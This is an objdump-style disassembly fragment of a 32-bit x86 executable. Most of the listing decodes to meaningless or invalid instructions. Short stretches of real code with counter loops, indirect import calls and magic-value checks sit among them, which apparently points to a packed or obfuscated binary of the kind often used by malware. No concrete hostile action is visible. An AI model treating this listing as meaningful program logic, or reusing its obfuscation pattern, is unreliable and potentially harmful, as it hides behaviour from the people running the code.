  4075bf:	jb     0x407591
  4075c5:	mov    esi,0x32729e
  4075ca:	adc    DWORD PTR ds:0x44e418,0x44e40c
  4075d4:	jmp    0x40770b
  4075d9:	adc    dh,al
  4075db:	in     al,0x9d
  4075dd:	data16 jge 0x407635
  4075e0:	mov    ebx,0x5b1ba91b
  4075e5:	lea    esi,[edi]
  4075e7:	cmp    DWORD PTR [ebx],ebp
  4075e9:	mov    cl,0x33
  4075eb:	jl     0x407669
  4075ed:	push   es
  4075ee:	jg     0x40766c
  4075f0:	jl     0x40758c
  4075f2:	retf   0xd524
  4075f5:	lods   al,BYTE PTR ds:[esi]
  4075f6:	call   0x3d78:0xc055b2a0
  4075fd:	test   BYTE PTR [ecx-0x54104b99],bh
  407603:	or     eax,0xe7beca8c
  407608:	adc    al,dl
  40760a:	mov    al,0x69
  40760c:	imul   ecx,DWORD PTR [esi],0x9
  40760f:	push   ebx
  407610:	test   eax,0x2d73190b
  407615:	das    
  407616:	loope  0x40761b
  407618:	addr16 aam 0x1
  40761b:	outs   dx,DWORD PTR ds:[esi]
  40761c:	add    ch,BYTE PTR [ecx+0x4c0a6569]
  407622:	arpl   WORD PTR [esp+eiz*2-0x3ddb432f],ax
  407629:	daa    
  40762a:	sbb    eax,0xc9fc4d60
  40762f:	leave  
  407630:	clc    
  407631:	(bad)  
  407633:	daa    
  407634:	xchg   ebp,eax
  407635:	pushf  
  407636:	push   ss
  407637:	lds    ebp,FWORD PTR ds:0x2c6a2fa5
  40763d:	lock adc DWORD PTR cs:[edi-0x1a],esp
  407642:	adc    bl,BYTE PTR [edx+0x1c93ea2]
  407648:	inc    edx
  407649:	adc    edi,DWORD PTR [eax]
  40764b:	test   BYTE PTR [esi+0x7a5032ec],0x23
  407652:	mov    al,0x31
  407654:	push   ecx
  407655:	call   0xda9:0xbce23d38
  40765c:	(bad)  
  40765d:	sbb    cl,dl
  40765f:	div    BYTE PTR [ebx+0x154e9762]
  407665:	ror    DWORD PTR [ebp-0x43],cl
  407668:	pop    ebp
  407669:	add    eax,DWORD PTR [eax-0x75]
  40766c:	dec    edi
  40766d:	into   
  40766e:	cdq    
  40766f:	jle    0x40766b
  407671:	jo     0x407649
  407673:	out    0xe5,eax
  407675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407676:	call   0x2b0b:0x79e968e5
  40767d:	ins    DWORD PTR es:[edi],dx
  40767e:	jge    0x4076d6
  407680:	sbb    al,0xe3
  407682:	outs   dx,BYTE PTR ds:[esi]
  407683:	lahf   
  407684:	jmp    0x407640
  407686:	jbe    0x40760a
  407688:	in     al,dx
  407689:	sbb    dh,BYTE PTR [edx-0x273b8990]
  40768f:	xor    bl,BYTE PTR [eax-0x1b03764]
  407695:	push   ebp
  407696:	or     al,BYTE PTR [ebx+0x662ec3fa]
  40769c:	ret    0x8422
  40769f:	push   0x75
  4076a1:	aad    0x2
  4076a3:	cmp    BYTE PTR es:[ebp-0x33],cl
  4076a7:	push   edx
  4076a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076a9:	xchg   ebp,eax
  4076aa:	lds    ebx,FWORD PTR [ebp+eiz*1-0x5f6e2109]
  4076b1:	jae    0x4076f1
  4076b3:	(bad)  
  4076b4:	pop    ebp
  4076b5:	mov    cl,0xcd
  4076b7:	mov    DWORD PTR [esi-0x2e5983fd],ebp
  4076bd:	fdivr  st(3),st
  4076bf:	lods   al,BYTE PTR ds:[esi]
  4076c0:	mov    al,ds:0xc38ad3cf
  4076c5:	in     eax,dx
  4076c6:	xor    DWORD PTR [ebp+ebx*1+0x1530f1c0],esi
  4076cd:	mov    ebx,0x8246d0c8
  4076d2:	fs pop ds
  4076d4:	dec    ebx
  4076d5:	inc    esp
  4076d6:	adc    eax,0x42f607f3
  4076db:	xchg   esi,eax
  4076dc:	add    ah,BYTE PTR [ebp+0x71]
  4076df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076e0:	ret    0xb937
  4076e3:	icebp  
  4076e4:	in     eax,dx
  4076e5:	int3   
  4076e6:	pop    ebp
  4076e7:	add    BYTE PTR [ebp-0x9],cl
  4076ea:	push   esp
  4076eb:	sbb    al,0xbc
  4076ed:	xor    DWORD PTR [edi-0x166a2e03],ebx
  4076f3:	or     BYTE PTR [ebp-0x62f2544],dl
  4076f9:	(bad)  
  4076fa:	int    0x68
  4076fc:	xchg   DWORD PTR [eax+0x2800382d],eax
  407702:	je     0x4076a7
  407704:	aaa    
  407705:	or     ch,dh
  407707:	cmc    
  407708:	pop    ss
  407709:	neg    BYTE PTR [esi+0x33]
  40770c:	fld    st(7)
  40770e:	add    eax,0x41075b
  407713:	sbb    eax,0x33000075
  407718:	rol    BYTE PTR [ecx+0x44898005],cl
  40771e:	add    dl,bl
  407720:	push   cs
  407721:	add    BYTE PTR [eax],al
  407723:	add    eax,esi
  407725:	and    DWORD PTR ds:0x448980,0x4247d6
  40772f:	add    ebx,esi
  407731:	mov    DWORD PTR ds:0x448988,0x5df4
  40773b:	jmp    0x407872
  407740:	ss push 0x77
  407743:	call   0x6b2de4f3
  407748:	pop    ecx
  407749:	fcom   st(3)
  40774b:	xor    al,0xdd
  40774d:	cmc    
  40774e:	mov    ah,0x1
  407750:	pop    ebx
  407751:	xor    bh,BYTE PTR [esp+edi*2+0x6]
  407755:	jg     0x4077d3
  407757:	jl     0x4076e4
  407759:	cld    
  40775a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40775b:	add    ebp,ecx
  40775d:	mov    bl,0x30
  40775f:	(bad)  
  407760:	xor    bh,bl
  407762:	and    ebp,DWORD PTR [eax-0x44c10a4c]
  407768:	mov    sp,?
  40776b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40776c:	mov    al,ds:0xf6a13158
  407771:	push   0xe0d239a3
  407776:	fwait
  407777:	xchg   ecx,eax
  407778:	dec    esi
  407779:	ret    0xce36
  40777c:	mov    ah,0x8d
  40777e:	sub    esp,DWORD PTR [ebp-0x10]
  407781:	xor    DWORD PTR [ebp+0x74],ecx
  407784:	popa   
  407785:	repz out dx,eax
  407787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407788:	ficom  WORD PTR [eax]
  40778a:	sbb    BYTE PTR [ebx+0x24],ah
  40778d:	ja     0x4077a1
  40778f:	cld    
  407790:	jne    0x407798
  407792:	outs   dx,BYTE PTR ds:[esi]
  407793:	inc    ecx
  407794:	ss mov ch,0x42
  407797:	or     edi,DWORD PTR [edx-0x7e3b2619]
  40779d:	xor    esp,DWORD PTR [edx+ebx*2]
  4077a0:	dec    eax
  4077a1:	fs push ebp
  4077a3:	popf   
  4077a4:	aas    
  4077a5:	pop    eax
  4077a6:	push   esp
  4077a7:	xlat   BYTE PTR ds:[ebx]
  4077a8:	jecxz  0x4077e8
  4077aa:	pop    ss
  4077ab:	or     al,0xdd
  4077ad:	pop    ss
  4077ae:	add    esi,DWORD PTR [ecx+0x6abc4a1f]
  4077b4:	adc    BYTE PTR [edx],0x67
  4077b7:	mov    al,0x9f
  4077b9:	out    dx,eax
  4077ba:	scas   eax,DWORD PTR es:[edi]
  4077bb:	pusha  
  4077bc:	xor    BYTE PTR [ebx],dh
  4077be:	push   ecx
  4077bf:	pop    ax
  4077c1:	imul   esp,DWORD PTR [ecx-0x77299568],0x5f
  4077c8:	lahf   
  4077c9:	cmp    DWORD PTR [esi+eax*8],esp
  4077cc:	lahf   
  4077cd:	cmp    cl,bl
  4077cf:	mov    eax,0xcd09b2af
  4077d4:	push   ecx
  4077d5:	fnstcw WORD PTR [esi-0x7b]
  4077d8:	js     0x4077a6
  4077da:	popf   
  4077db:	mov    dh,0x14
  4077dd:	ins    BYTE PTR es:[edi],dx
  4077de:	sbb    cl,BYTE PTR [ecx]
  4077e0:	mov    esp,0xdf0f8203
  4077e5:	sub    ebx,DWORD PTR [edx]
  4077e7:	iret   
  4077e8:	jge    0x407822
  4077ea:	jecxz  0x40778a
  4077ec:	lods   al,BYTE PTR ds:[esi]
  4077ed:	inc    edi
  4077ee:	mov    ah,BYTE PTR [ecx]
  4077f0:	in     al,0x77
  4077f2:	push   esi
  4077f3:	test   BYTE PTR [eax],ch
  4077f5:	retf   
  4077f6:	push   0xffffffbc
  4077f8:	pop    esp
  4077f9:	sub    eax,DWORD PTR [esi+0x36b442ac]
  4077ff:	or     DWORD PTR [esp+edi*8],esi
  407802:	hlt    
  407803:	cmp    eax,0x72b6848d
  407808:	xchg   ebp,eax
  407809:	leave  
  40780a:	xchg   edx,eax
  40780b:	dec    esp
  40780c:	call   0x948747bc
  407811:	mov    ebx,0xe2d89ff8
  407816:	ss in  eax,dx
  407818:	xor    BYTE PTR [eax-0x4098fe12],dl
  40781e:	fdiv   DWORD PTR [edi-0x30]
  407821:	out    0x23,al
  407823:	mov    ch,0x58
  407825:	arpl   cx,sp
  407827:	in     al,dx
  407828:	mov    ds:0x23604e15,al
  40782d:	mov    al,ds:0x4f2f2569
  407832:	adc    bl,ch
  407834:	out    dx,al
  407835:	outs   dx,BYTE PTR ds:[esi]
  407836:	jmp    0xe3d7:0x58bdabe0
  40783d:	push   edi
  40783e:	test   BYTE PTR ds:0x460da51d,cl
  407844:	cmp    ebp,DWORD PTR [ecx+0x67177338]
  40784a:	jmp    0xf98df152
  40784f:	sbb    DWORD PTR [ecx+edx*8+0x5eb8c439],edi
  407856:	or     DWORD PTR [edx],esi
  407858:	push   cs
  407859:	fs xchg edx,eax
  40785b:	ja     0x4078da
  40785d:	out    0xe,eax
  40785f:	inc    edx
  407860:	sub    esp,DWORD PTR [ebp-0x14]
  407863:	aas    
  407864:	xor    eax,0x38f9ec0c
  407869:	dec    ebx
  40786a:	inc    bl
  40786c:	push   ss
  40786d:	scas   al,BYTE PTR es:[edi]
  40786e:	ja     0x4078e6
  407870:	call   0xc615:0x8bf3f782
  407877:	inc    edi
  407878:	inc    edx
  407879:	add    BYTE PTR [ebx+0x45c7e055],cl
  40787f:	aam    0xb5
  407881:	dec    esi
  407882:	add    BYTE PTR [eax],al
  407884:	mov    DWORD PTR ds:0x44b6e8,0x3c9f
  40788e:	cmp    eax,DWORD PTR [edx]
  407890:	je     0x408082
  407896:	mov    edx,DWORD PTR ds:0x410743
  40789c:	and    DWORD PTR ds:0x44e418,edx
  4078a2:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  4078a9:	and    DWORD PTR ds:0x4247ca,0x0
  4078b3:	mov    edx,DWORD PTR ds:0x4247ca
  4078b9:	inc    edx
  4078ba:	mov    DWORD PTR ds:0x4247ca,edx
  4078c0:	cmp    DWORD PTR ds:0x4247ca,0x16
  4078c7:	jne    0x4078f0
  4078cd:	push   DWORD PTR [ebp-0x20]
  4078d0:	push   0x3477
  4078d5:	push   0x4489a0
  4078da:	push   DWORD PTR [ebp-0x10]
  4078dd:	push   0x7aad
  4078e2:	push   0x3f84
  4078e7:	push   DWORD PTR [ebp-0x1c]
  4078ea:	call   DWORD PTR ds:0x443014
  4078f0:	cmp    DWORD PTR ds:0x4247ca,0x13
  4078f7:	jb     0x4078b3
  4078fd:	lea    eax,[ebp-0xc]
  407900:	mov    DWORD PTR [ebp-0x10],eax
  407903:	xor    edx,edx
  407905:	xor    edx,DWORD PTR ds:0x4454e4
  40790b:	mov    eax,ds:0x4489b8
  407910:	sub    edx,eax
  407912:	xor    edx,DWORD PTR [edx+eax*1]
  407915:	jmp    0x407a4c
  40791a:	lea    eax,[eax+ebx*1]
  40791d:	mov    WORD PTR [ebp+0x1d8d80],ds
  407923:	std    
  407924:	inc    esi
  407925:	nop
  407926:	(bad)  
  407927:	leave  
  407928:	push   esi
  407929:	fsub   QWORD PTR [ebp+0x35]
  40792c:	jl     0x4079aa
  40792e:	push   es
  40792f:	jg     0x4079ad
  407931:	jl     0x4079a1
  407933:	adc    esi,DWORD PTR [esi-0x5e968b3e]
  407939:	mov    ebx,0x78ac0fce
  40793e:	loope  0x407956
  407940:	adc    ecx,DWORD PTR [ebx]
  407942:	out    0x8,eax
  407944:	(bad)  [ecx-0x6b]
  407947:	xlat   BYTE PTR ds:[ebx]
  407948:	cmp    DWORD PTR [ebx-0x124fd676],eax
  40794e:	std    
  40794f:	push   esi
  407950:	sbb    eax,0x8daa2f19
  407955:	pushf  
  407956:	sbb    eax,0xde02c5ee
  40795b:	loopne 0x40798e
  40795d:	dec    eax
  40795e:	or     dh,BYTE PTR [esi+ebx*8-0xe]
  407962:	enter  0x8b84,0x69
  407966:	fcmovnu st,st(2)
  407968:	stos   DWORD PTR es:[edi],eax
  407969:	hlt    
  40796a:	pop    es
  40796b:	rcl    BYTE PTR [eax+0x5f54321c],cl
  407971:	ret    
  407972:	adc    bh,BYTE PTR [esi]
  407974:	xchg   BYTE PTR [ebx],al
  407976:	imul   eax,DWORD PTR [ecx-0x19],0xffffffa8
  40797a:	fwait
  40797b:	add    eax,0x970ef25b
  407980:	jle    0x4079a2
  407982:	sbb    DWORD PTR [edi-0x24],esp
  407985:	sti    
  407986:	sti    
  407987:	inc    esi
  407988:	cs mov edi,0xdfd73966
  40798e:	(bad)  
  40798f:	pop    ds
  407990:	test   DWORD PTR [ecx+edi*4-0x12],esp
  407994:	into   
  407995:	sub    dh,BYTE PTR [esi]
  407997:	jecxz  0x407925
  407999:	cmp    eax,0x2712e1e5
  40799e:	jae    0x407935
  4079a0:	jbe    0x407958
  4079a2:	nop
  4079a3:	sub    BYTE PTR [ebx+0xc],0x99
  4079a7:	cli    
  4079a8:	in     al,0xb3
  4079aa:	lahf   
  4079ab:	xchg   esi,eax
  4079ac:	xor    BYTE PTR [edi-0xfd01cbf],0x8e
  4079b3:	cmp    DWORD PTR [eax-0x7feafc0e],eax
  4079b9:	adc    al,0xd
  4079bb:	rcr    DWORD PTR [ecx+0x62],cl
  4079be:	faddp  st(2),st
  4079c0:	jge    0x407a04
  4079c2:	xor    BYTE PTR [esi+ecx*1-0x4d],al
  4079c6:	fnstsw WORD PTR [edx-0x68cff6ab]
  4079cc:	outs   dx,BYTE PTR ds:[esi]
  4079cd:	mul    DWORD PTR [edx-0xd1734de]
  4079d3:	add    BYTE PTR [ebx+0x5b],bh
  4079d6:	jb     0x407a46
  4079d8:	mov    gs,WORD PTR [edx+0x47a77b66]
  4079de:	aas    
  4079df:	outs   dx,BYTE PTR ds:[esi]
  4079e0:	ror    DWORD PTR [ebx-0xf],1
  4079e3:	stos   BYTE PTR es:[edi],al
  4079e4:	shl    DWORD PTR [eax],0xd1
  4079e7:	and    cl,BYTE PTR [ebx*2-0x7877f99f]
  4079ee:	sub    eax,0xffffffa3
  4079f1:	imul   ebp,edx,0x2b
  4079f4:	leave  
  4079f5:	sub    eax,0x5afb6a0e
  4079fa:	sahf   
  4079fb:	and    edi,DWORD PTR [ebx+0x50]
  4079fe:	jmp    0xad8c1462
  407a03:	lahf   
  407a04:	(bad)  
  407a05:	push   ebp
  407a06:	dec    eax
  407a07:	int    0x64
  407a09:	outs   dx,DWORD PTR ds:[esi]
  407a0a:	cdq    
  407a0b:	ret    
  407a0c:	stc    
  407a0d:	and    edx,DWORD PTR [ebp+0x22bb124]
  407a13:	jns    0x4079c6
  407a15:	inc    eax
  407a16:	pop    edi
  407a17:	inc    ecx
  407a18:	sbb    BYTE PTR ds:0xef6a40a2,dl
  407a1e:	iret   
  407a1f:	xchg   esp,eax
  407a20:	add    eax,0x9c49d587
  407a25:	mov    al,0x97
  407a27:	mov    al,cl
  407a29:	xchg   esi,eax
  407a2a:	add    eax,0xa3cb9360
  407a2f:	sub    ebx,DWORD PTR [ebx+eax*8+0x67b5597c]
  407a36:	add    eax,0xb380ac1b
  407a3b:	and    BYTE PTR [ebx],cl
  407a3d:	mov    edx,0x47b002b
  407a42:	and    eax,ecx
  407a44:	dec    ecx
  407a45:	push   es
  407a46:	scas   eax,DWORD PTR es:[edi]
  407a47:	leave  
  407a48:	stos   DWORD PTR es:[edi],eax
  407a49:	fwait
  407a4a:	jg     0x407a5f
  407a4c:	mov    eax,DWORD PTR [ebp-0x10]
  407a4f:	mov    DWORD PTR ds:0x448994,0x1e
  407a59:	cmp    DWORD PTR ds:0x448994,0x0
  407a60:	je     0x407aad
  407a66:	cmp    DWORD PTR ds:0x448994,0x10
  407a6d:	jne    0x407a7f
  407a73:	push   DWORD PTR [ebp-0x1c]
  407a76:	push   DWORD PTR [ebp-0x18]
  407a79:	call   DWORD PTR ds:0x443018
  407a7f:	cmp    DWORD PTR ds:0x448994,0x11
  407a86:	jne    0x407a99
  407a8c:	mov    edx,DWORD PTR ds:0x448994
  407a92:	dec    edx
  407a93:	mov    DWORD PTR ds:0x448994,edx
  407a99:	xor    edx,edx
  407a9b:	add    edx,DWORD PTR ds:0x448994
  407aa1:	dec    edx
  407aa2:	mov    DWORD PTR ds:0x448994,edx
  407aa8:	jmp    0x407a59
  407aad:	mov    edx,DWORD PTR [eax]
  407aaf:	imul   edx,edx,0xf89ea9e0
  407ab5:	mov    DWORD PTR [eax],edx
  407ab7:	mov    eax,DWORD PTR [ebp-0xc]
  407aba:	cmp    eax,0x1fe34420
  407abf:	je     0x407c13
  407ac5:	mov    eax,DWORD PTR [ebp-0x1c]
  407ac8:	jmp    0x407bff
  407acd:	(bad)  
  407ace:	fsub   DWORD PTR [edx+0x76]
  407ad1:	jp     0x407a69
  407ad3:	jp     0x407b2d
  407ad5:	mov    ch,0xbf
  407ad7:	xchg   ebp,eax
  407ad8:	fbld   TBYTE PTR [edi+0x27]
  407adb:	stc    
  407adc:	xchg   ebx,eax
  407add:	getsec 
  407adf:	jl     0x407b5d
  407ae1:	push   es
  407ae2:	jg     0x407b60
  407ae4:	jl     0x407ab3
  407ae6:	arpl   WORD PTR [edx+0x38],si
  407ae9:	dec    ebx
  407aea:	popf   
  407aeb:	mov    eax,0x124b7523
  407af0:	sub    DWORD PTR [esi],ecx
  407af2:	arpl   WORD PTR [eax],ax
  407af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407af5:	gs das 
  407af7:	pop    esp
  407af8:	ins    BYTE PTR es:[edi],dx
  407af9:	sbb    eax,0x5fdb68ff
  407afe:	mov    ds:0x1853ee0d,eax
  407b03:	shl    DWORD PTR [ecx-0x5f],0xf6
  407b07:	xchg   edi,eax
  407b08:	into   
  407b09:	(bad)  
  407b0b:	fs xchg ecx,eax
  407b0d:	mov    bl,0x5f
  407b0f:	out    dx,eax
  407b10:	jmp    0x407ac4
  407b12:	(bad)  
  407b13:	push   ds
  407b14:	imul   ebx,DWORD PTR [esi-0x3],0x1e83a6e7
  407b1b:	imul   esi,DWORD PTR [edi-0x48],0x391d8dd5
  407b22:	xor    esi,DWORD PTR [eax-0x48]
  407b25:	test   BYTE PTR [edx],0xe0
  407b28:	stos   DWORD PTR es:[edi],eax
  407b29:	jle    0x407b39
  407b2b:	dec    ecx
  407b2c:	push   ss
  407b2d:	inc    eax
  407b2e:	cmp    al,0x1e
  407b30:	and    eax,0x360880f6
  407b35:	fisubr DWORD PTR [edi]
  407b38:	inc    esi
  407b39:	hlt    
  407b3a:	arpl   si,sp
  407b3c:	test   DWORD PTR [eax],ecx
  407b3e:	fst    DWORD PTR [edi-0x71]
  407b41:	adc    al,0xff
  407b43:	aas    
  407b44:	fild   DWORD PTR [ebp-0x5bf06278]
  407b4a:	fsincos 
  407b4c:	push   ds
  407b4d:	add    DWORD PTR [ebp-0x37852f3e],edi
  407b53:	ss fstp st(5)
  407b56:	sbb    DWORD PTR [esi-0x61],ebx
  407b59:	sub    al,0x9f
  407b5b:	fnstenv [eax-0x2f]
  407b5e:	jge    0x407af7
  407b60:	test   DWORD PTR [edi+ebp*8+0x76],0x5fdb7cf7
  407b68:	hlt    
  407b69:	dec    edi
  407b6a:	mov    al,0x46
  407b6c:	pop    edx
  407b6d:	push   ss
  407b6e:	cmp    al,0x53
  407b70:	loop   0x407bcf
  407b72:	sub    DWORD PTR [ebx],0x5fba43ae
  407b78:	mov    ecx,0xc9dee63f
  407b7d:	sub    bh,BYTE PTR [ebp-0xa]
  407b80:	sbb    bh,BYTE PTR [esi+0x34b2533a]
  407b86:	mov    eax,0xe1777795
  407b8b:	fiadd  DWORD PTR [edi+0x78]
  407b8e:	int3   
  407b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b90:	push   esi
  407b91:	inc    ebp
  407b92:	jnp    0x407bca
  407b94:	sub    dl,al
  407b96:	test   edx,0x742d38f1
  407b9c:	inc    esp
  407b9d:	and    bh,BYTE PTR [ecx]
  407b9f:	xor    BYTE PTR [edx-0x3a],bh
  407ba2:	rcr    DWORD PTR [edi+ecx*4+0x1f],1
  407ba6:	gs es sahf 
  407ba9:	rcr    edi,cl
  407bab:	sbb    ebx,ebp
  407bad:	add    ebx,DWORD PTR [edx+0x2b01428c]
  407bb3:	(bad)  
  407bb4:	div    ebp
  407bb6:	mov    bl,0xdf
  407bb8:	mov    ebx,DWORD PTR fs:[edi-0x2561230d]
  407bbf:	stos   DWORD PTR es:[edi],eax
  407bc0:	dec    eax
  407bc1:	js     0x407c13
  407bc3:	addr16 loopne 0x407b8b
  407bc6:	fist   WORD PTR [edi-0x669badd0]
  407bcc:	mov    eax,ds:0x918b62dd
  407bd1:	daa    
  407bd2:	mov    eax,0x9de204ab
  407bd7:	mov    bh,0xaf
  407bd9:	mov    eax,ds:0xad0f4c22
  407bde:	ds jmp 0x407be7
  407be1:	sub    BYTE PTR [ebp-0x43],bl
  407be4:	ins    BYTE PTR es:[edi],dx
  407be5:	push   ebx
  407be6:	icebp  
  407be7:	adc    esp,ebp
  407be9:	pop    edi
  407bea:	imul   edx,DWORD PTR [ebx-0x43c474f0],0xf455d29a
  407bf4:	xchg   edx,eax
  407bf5:	cli    
  407bf6:	or     esi,DWORD PTR [ebx+0x1b1e98b7]
  407bfc:	xchg   ecx,eax
  407bfd:	outs   dx,BYTE PTR ds:[esi]
  407bfe:	cmp    eax,DWORD PTR [ecx+0x751c9008]
  407c04:	pusha  
  407c05:	mov    eax,DWORD PTR [ebp-0x8]
  407c08:	xor    eax,ecx
  407c0a:	add    eax,esi
  407c0c:	pop    edi
  407c0d:	pop    esi
  407c0e:	pop    ebx
  407c0f:	leave  
  407c10:	ret    0x4
  407c13:	mov    eax,DWORD PTR [ebp-0xc]
  407c16:	add    eax,DWORD PTR [ebp-0x18]
  407c19:	cmp    eax,0x188271cd
  407c1e:	je     0x407d69
  407c24:	mov    eax,DWORD PTR [ebp-0x10]
  407c27:	and    DWORD PTR [eax],0x751c9d
  407c2d:	jmp    0x407c05
  407c32:	jmp    0x407d69
  407c37:	jnp    0x407be9
  407c39:	lds    edx,FWORD PTR [eax+0x5b7da5fd]
  407c3f:	cmp    ah,BYTE PTR [ebp+0x70]
  407c42:	adc    eax,0xc803dc40
  407c47:	sub    DWORD PTR [esi],esi
  407c49:	jl     0x407cc7
  407c4b:	push   es
  407c4c:	jg     0x407cca
  407c4e:	jl     0x407c6d
  407c50:	cli    
  407c51:	jbe    0x407cbf
  407c53:	sub    ah,0x3a
  407c56:	leave  
  407c57:	cli    
  407c58:	dec    ecx
  407c59:	es bnd jg 0x407c58
  407c5d:	mov    ecx,0x675f27b3
  407c62:	icebp  
  407c63:	xchg   esi,eax
  407c64:	pop    eax
  407c65:	dec    edi
  407c66:	jmp    0x36e7:0xebdffb32
  407c6d:	or     eax,0x212b93ed
  407c72:	into   
  407c73:	mov    BYTE PTR [edi-0x7c],ch
  407c76:	nop
  407c77:	shl    ebp,cl
  407c79:	jp     0x407c90
  407c7b:	push   ds
  407c7c:	xlat   BYTE PTR ds:[ebx]
  407c7d:	ins    BYTE PTR es:[edi],dx
  407c7e:	push   ecx
  407c7f:	ret    
  407c80:	jns    0x407c03
  407c82:	inc    edi
  407c83:	pop    edx
  407c84:	pusha  
  407c85:	outs   dx,DWORD PTR ds:[esi]
  407c86:	pusha  
  407c87:	sbb    al,0xa2
  407c89:	push   eax
  407c8a:	cmp    al,BYTE PTR [ecx+0x7915bf11]
  407c90:	sbb    edx,DWORD PTR [ebx+ebp*1+0x17]
  407c94:	scas   eax,DWORD PTR es:[edi]
  407c95:	pop    ebp
  407c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c97:	mov    al,0xa9
  407c99:	imul   esi,DWORD PTR [ecx-0x7bf172ad],0x8a8a31af
  407ca3:	jecxz  0x407c26
  407ca5:	mov    ch,0x2d
  407ca7:	adc    edx,ebx
  407ca9:	jle    0x407c49
  407cab:	sub    al,0xbe
  407cad:	or     BYTE PTR [ecx],bl
  407caf:	push   esi
  407cb0:	xor    BYTE PTR [ebx+edx*2+0x4a5fc5e9],0x85
  407cb8:	neg    BYTE PTR [ebp-0x5af2c5ff]
  407cbe:	mov    al,0x94
  407cc0:	iret   
  407cc1:	push   esp
  407cc2:	and    al,0x8c
  407cc4:	mov    dh,0xf9
  407cc7:	mov    ch,0xdd
  407cc9:	mov    DWORD PTR [esi+ebx*8],edi
  407ccc:	in     al,0x3a
  407cce:	cdq    
  407ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd0:	in     eax,0x97
  407cd2:	jae    0x407d06
  407cd4:	mov    ecx,0xed9c0796
  407cd9:	push   edi
  407cda:	int3   
  407cdb:	in     al,dx
  407cdc:	addr16 cmc 
  407cde:	dec    esp
  407cdf:	xchg   edi,eax
  407ce0:	jne    0x407cd3
  407ce2:	dec    ecx
  407ce3:	lock dec ecx
  407ce5:	adc    eax,0x614b7918
  407cea:	stos   BYTE PTR es:[edi],al
  407ceb:	xchg   BYTE PTR ss:[edi+0x3158f2cd],al
  407cf2:	mov    bl,0x8e
  407cf4:	pusha  
  407cf5:	inc    edx
  407cf6:	and    dl,cl
  407cf8:	pop    edx
  407cf9:	mov    WORD PTR [ecx-0x462a1eaf],fs
  407cff:	loopne 0x407d36
  407d01:	dec    edi
  407d02:	push   esp
  407d03:	scas   al,BYTE PTR es:[edi]
  407d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d05:	mov    BYTE PTR [edx+0x4f699e1],bh
  407d0b:	pusha  
  407d0c:	(bad)  
  407d0d:	je     0x407cc7
  407d0f:	mov    esp,0x84abae86
  407d14:	aad    0x20
  407d16:	in     al,0xbb
  407d18:	xor    DWORD PTR [ecx-0x78493cfb],edi
  407d1e:	mov    esi,0xc7270196
  407d23:	in     al,dx
  407d24:	dec    edi
  407d25:	leave  
  407d26:	test   eax,0x89028df4
  407d2b:	cmp    dl,cl
  407d2d:	and    bl,ch
  407d2f:	add    al,0x50
  407d31:	rcl    DWORD PTR [ecx-0x7380fb3a],1
  407d37:	dec    eax
  407d38:	out    0x6,eax
  407d3a:	xchg   ebp,eax
  407d3b:	adc    bl,BYTE PTR ds:0xba1745f6
  407d41:	mov    ebp,0x9e0ba0ad
  407d46:	push   eax
  407d47:	sbb    dl,BYTE PTR [ecx+0x43]
  407d4a:	and    DWORD PTR [ebx-0x63],ebp
  407d4d:	xchg   edx,eax
  407d4e:	cmp    esi,DWORD PTR [eax]
  407d50:	add    al,0xdb
  407d52:	jno    0x407dd0
  407d54:	or     BYTE PTR [ebx+0x6e],ch
  407d57:	(bad)  
  407d58:	cmp    edx,DWORD PTR [edi+0x2e6d337a]
  407d5e:	push   ds
  407d5f:	push   ebx
  407d60:	imul   ebp,DWORD PTR ds:0x3950951c,0x8bdbc170
  407d6a:	inc    ebp
  407d6b:	hlt    
  407d6c:	mov    edx,DWORD PTR [ebp-0x18]
  407d6f:	or     eax,edx
  407d71:	cmp    eax,0xffff6dad
  407d76:	je     0x407ec1
  407d7c:	mov    eax,DWORD PTR [ebp-0x10]
  407d7f:	jmp    0x407eb6
  407d84:	push   edi
  407d85:	add    BYTE PTR [esi-0x1b],bh
  407d88:	jge    0x407d6f
  407d8a:	jnp    0x407d26
  407d8c:	and    al,BYTE PTR [ebx-0x5c6d8a9c]
  407d92:	pop    es
  407d93:	mov    dl,0x33
  407d95:	leave  
  407d96:	jl     0x407e14
  407d98:	push   es
  407d99:	jg     0x407e17
  407d9b:	jl     0x407d59
  407d9d:	outs   dx,BYTE PTR ds:[esi]
  407d9e:	cld    
  407d9f:	loope  0x407db9
  407da1:	xor    DWORD PTR [ecx-0x26],0xce1c6bf8
  407da8:	sbb    DWORD PTR [esi-0x1cffabea],esp
  407dae:	mov    ah,0xd
  407db0:	ret    
  407db1:	inc    ebp
  407db2:	cmp    bh,ah
  407db4:	jle    0x407d3b
  407db6:	pusha  
  407db7:	cmp    esi,DWORD PTR [eax-0x5873a4e8]
  407dbd:	add    bl,dl
  407dbf:	out    0x5f,al
  407dc1:	or     esi,DWORD PTR [ebp+0x65]
  407dc4:	push   edx
  407dc5:	std    
  407dc6:	std    
  407dc7:	loopne 0x407dd8
  407dc9:	and    esi,DWORD PTR [edi-0x4b145600]
  407dcf:	adc    BYTE PTR ds:0xd17b9fda,cl
  407dd5:	adc    eax,0xd2f6e71
  407dda:	jmp    0x407da5
  407ddc:	sub    DWORD PTR [ebp+0x49],esp
  407ddf:	cdq    
  407de0:	int    0x71
  407de2:	gs jecxz 0x407e26
  407de5:	test   DWORD PTR [eax+0x2f],eax
  407de8:	jmp    0x407e09
  407dea:	sbb    BYTE PTR [edi+0x35ebdcba],0xd9
  407df1:	aad    0x2f
  407df3:	mov    eax,ds:0xb1dafd8c
  407df8:	cmp    eax,0x1f99ec76
  407dfd:	inc    esi
  407dfe:	pusha  
  407dff:	dec    ecx
  407e00:	pop    ss
  407e01:	mov    ebx,0x6b1e8903
  407e06:	ds jns 0x407e3c
  407e09:	ss mov ecx,0x761e05d
  407e0f:	jg     0x407dee
  407e11:	sub    bh,BYTE PTR [ebx]
